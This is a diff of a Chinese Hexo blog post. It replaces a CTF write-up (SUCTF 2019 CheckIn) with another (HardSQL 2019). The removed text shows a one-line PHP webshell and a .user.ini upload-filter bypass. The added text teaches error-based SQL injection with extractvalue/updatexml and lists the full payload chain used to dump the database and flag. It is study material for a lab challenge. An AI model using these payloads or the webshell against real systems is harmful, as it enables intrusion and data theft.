@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>寒假练习18 - Hexo</title>
+<title>寒假练习22 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -149,42 +149,60 @@
                 <p><span class="label">Author</span>
                     <a href="https://george186.github.io"
                        target="_blank">george</a>
-                    <span title="Last edited at&nbsp;2021-02-03">2021-02-03</span>
+                    <span title="Last edited at&nbsp;2021-02-07">2021-02-07</span>
                 </p>
                 <p>一个写代码的「伪文人」</p>
             </div>
-            <h2 class="post-title">寒假练习18</h2>
+            <h2 class="post-title">寒假练习22</h2>
             <div class="post-meta">
-                emm... 1266 words in the article |
+                emm... 2530 words in the article |
                 you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
         <div class="post-content markdown-body">
-            <p>今天做了一道别样的上传文件题。   </p>
-<h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn 1"></a>[SUCTF 2019]CheckIn 1</h1><p>打开题目，发现让我们上传文件，毫不犹豫的写了个一句话木马上传抓包。<br><img src="https://i.loli.net/2021/02/04/WyhbxgpBLC5POAm.png" alt="13.png"><br>抓包后发现它过滤了php语言中的<?和?>符号，从以前做过的类似的题目积累可以知道这个符号用&lt;script来绕过，所以这样构造一句话木马。  </p>
-<blockquote>
-<p>&lt; script language=”php”&gt;eval($_REQUEST[shell]) </script >  </p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/04/L2wu7oOjN59Y1aP.png" alt="14.png">  </p>
-<p>接着它检测出来这个文件不是图片。我们先修改文件类型Content-Type，改为image/jpg。<br><img src="https://i.loli.net/2021/02/04/c9MqKxInWEv5bjP.png" alt="15.png"><br>发现它依旧检测出来不是图片，那么我们就在文件头加上GIF89a图片头。  </p>
-<p><img src="https://i.loli.net/2021/02/04/pgKyNdIYWXStC4n.png" alt="16.png"><br>可以可看到成功上传，接着就是修改文件后缀，让他是一个php文件，只有这样才能执行我们的一句话代码。但是经过多次尝试可以知道它过滤了php的后缀，所以我们要想别的方法来上传。  </p>
+            <p>今天将报错注入方法扩展两个。  </p>
+<h1 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h1><p>打开题目，发现是登陆题目。<br><img src="https://i.loli.net/2021/02/08/bAlqkn3FMRt9sLJ.png" alt="1.png"><br>尝试万能密码，发现不行，又尝试正常注入方式，发现有字符被过滤了。<br><img src="https://i.loli.net/2021/02/08/32qV5tzKNOnWRgE.png" alt="2.png"><br>于是进行一下fuzz模糊测试，看看有啥字符被过滤了。<br>经过测试后，发现union，空格等字符被过滤了，并且双写绕过也无法进行，只能考虑报错注入和布尔盲注了，可是布尔盲注也不行，因为无法判断页面回显是对还是错。而且相关函数还被过滤了。<br>那么手里只剩下报错注入了，可是这前学到的双查询的报错注入在这里也行不通，应该是相关函数被过滤了，那么只能用剩下的报错注入方法了。  </p>
 <hr>
-<h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h2><p>看了别人的wp后发现这道题要利用.user.ini文件来绕过对php后缀名的检测。<br>这个文件是php中的配置文件，搭过博客的可以知道配置文件管理着许多操作，而php.ini就是管理着所有php配置的配置文件，是php的默认配置文件，也就相当于admin用户。<br>但是.user.ini也是php配置文件，与默认的php.ini不同，这个是我们用户可以自定义的php.ini，当然，它可以操作的配置项相较于php.ini来说较少，也就相当于普通用户。<br>其中，利用.user.ini可以配置的项中有两个可以为我们所用。  </p>
+<h2 id="基于extractvalue-和updatexml-的报错注入"><a href="#基于extractvalue-和updatexml-的报错注入" class="headerlink" title="基于extractvalue()和updatexml()的报错注入"></a>基于extractvalue()和updatexml()的报错注入</h2><p>这两个函数分别也能完成报错注入，我们知道，报错注入的原理就是函数报错导致将数据库的信息给爆出来，从而达到sql注入的目的。在双查询注入中是count()这个聚合函数的报错，而这两个函数的报错同样可以达到这一目的。下面一一介绍。   </p>
+<h3 id="Extractvalue-函数"><a href="#Extractvalue-函数" class="headerlink" title="Extractvalue() 函数"></a>Extractvalue() 函数</h3><p>Extractvalue() 函数使用XPath表示法从XML字符串中提取值。更准确地说，它是会从目标xml文件中返回所包含查询值的字符串<br>extractvalue(‘XML_ document’,’Xpath_string’)<br>extractvalue(‘目标xml文件名’,’在xml中查询的字符串’)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询的话第二个参数的位置格式 为 /xxx/xx/xx/xx 。即使查询不到也不会报错，比如  </p>
 <blockquote>
-<p>auto_ append _ file<br>auto_ prepend _file</p>
+<p>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))</p>
 </blockquote>
-<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了include()函数。而auto_ append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：  </p>
+<p>这个就是查询anything文件中的/x/xx字符串，显然查询不到，但是结果会返回空却不会报错。<br>接下来如果我们这样构造：  </p>
 <blockquote>
-<p>auto_ prepend_file=01.gif</p>
+<p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p>
 </blockquote>
-<p>01.gif就是要包含的文件。这样就可以使所有的php文件都包含一个01.gif的文件。<br>所以我们就可以利用这一点来构造后门，上传一句话木马。  </p>
+<p>可以看到第二个参数的格式错了，这就导致了函数报错，而它的报错会将我们查询的值给报错出来，这就达到了目的。  </p>
+<h3 id="Updatexml-函数"><a href="#Updatexml-函数" class="headerlink" title="Updatexml() 函数"></a>Updatexml() 函数</h3><p>这个函数和extractvalue基本相同，这是一个修改xml文件的函数，语法为：<br>updatexml(‘XML_ document’,’Xpath _string’,’New _value’)<br>updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)<br>它的报错方式和上面的相同，也是字符位置的格式不对导致报错，最后的参数可以随便写入，如下：  </p>
+<blockquote>
+<p>select username from security.user where id=1 and (updatexml(‘anything’,concat(‘~’,(select database())),’anything’))</p>
+</blockquote>
+<p>第二个参数格式不对导致报错。  </p>
+<p>注：这两个函数报错查询的字符串长度有限，是32位。而双查询注入可以查询的字符长度是64位。如果要查询的字符串长度超过了限度，就要使用函数来分开查询，常见的有以下几种。  </p>
+<p><strong>substring()**函数进行字符串截取。这个函数在布尔盲注中使用过。可以将字符串进行截取后返回。这个一次最多也只能截取32位。<br>**limit x,1</strong>逐一查询。在爆表，列，值时可以使用这个函数逐一返回而不是concat函数返回一列。<br>**{left(),right()}**这个函数可以从字符串左或者从字符串右开始读取相应位数的字符串。左右读到的合起来可以构成完整的。  </p>
 <hr>
-<p>知道道题原理后我们可以先上传一个.user.ini文件。  </p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>了解了另外两种报错注入后我们来看这道题目。<br>我们使用Extractvalue()报错注入查询数据库名。空格被过滤使用（）来代替。  </p>
 <blockquote>
-<p>GIF89a<br>auto_ prepend_file=shell.gif<br><img src="https://s3.ax1x.com/2021/02/04/ylJyfP.md.png" alt="ylJyfP.md.png"><br>这样就实现了一个配置——使所有的php文件都包含一个shell.gif文件，这样就能解析我们上传的图片马。从而实现一句话木马功能。<br>接着再上传我们的图片马。<br><img src="https://s3.ax1x.com/2021/02/04/ylJROg.md.png" alt="ylJROg.md.png"><br>我们可以看到文件中有一个index.php文件，而我们的图片马也就包含在了这个php文件中，进而被解析，成为后门。<br>接下来用剑蚁连接或者直接在网址post数据就可以查看到flag了。  </p>
+<p>username=admin’^extractvalue(1,concat(~,(select(database()))))#&amp;password=aaa</p>
 </blockquote>
-<hr>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题给出了另一种绕过上传文件限制的思路，当过滤了php的所有可以用的后缀名时，我们可以通过修改php的配置文件令所有php文件都包含我们上传的图片马，从而可以实现上传图片马被解析达到上传一句话木马的目的。<br>下面附上详细的讲解。<br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.ini文件构成的PHP后门</a>  </p>
+<p>这里password也要输入，否则会报错（具体原因我还不知道）。<br>得到数据库名，看来这个报错注入行的通。<br><img src="https://i.loli.net/2021/02/08/dXC51mr4ap8Ttvj.png" alt="3.png"><br>爆表名。  </p>
+<blockquote>
+<p>admin’^extractvalue(1,concat(~,(select(group _concat(table _name))from(information _schema.tables)where((table _schema)like(‘geek’)))))#</p>
+</blockquote>
+<p>得到表名<br><img src="https://i.loli.net/2021/02/08/ec6VuG4kUXtqwd5.png" alt="4.png"><br>爆列名。  </p>
+<blockquote>
+<p>admin’^extractvalue(1,concat(~,(select(group _concat(column _name))from(information _schema.columns)where((table _name)like(‘H4rDsq1’)))))#</p>
+</blockquote>
+<p>注意这里使用like绕过=过滤。<br><img src="https://i.loli.net/2021/02/08/9byPsqfWKt1u6r3.png" alt="5.png"><br>爆flag。  </p>
+<blockquote>
+<p>admin’^extractvalue(1,concat(~,(select(password)from(geek.H4rDsq1))))#</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/08/4uNXpdoJVMzISt8.png" alt="6.png"><br>发现只有一半。<br>这里使用right函数来从右查看另一半。  </p>
+<blockquote>
+<p>admin’^extractvalue(1,concat(~,(select(right(password,30))from(geek.H4rDsq1))))#</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/08/yUvuoCzWcPstKie.png" alt="7.png"><br>拼起来就得到真正flag。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>通过这道题又多知道了两种报错注入方法，不得不感慨sql注入真的时方法万千，技巧也是多得多。<br>下面附上学习博客。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46145442/article/details/110254238?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161268582916780261991835%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161268582916780261991835&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-110254238.pc_search_result_cache&utm_term=extractvalue%25E5%2592%258Cupdatexml%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40989258/article/details/96978319?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161268582916780261991835%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161268582916780261991835&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-96978319.pc_search_result_cache&utm_term=extractvalue%25E5%2592%258Cupdatexml%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5">基于extractvalue()和updatexml()的报错注入</a></p>
 
             
                 
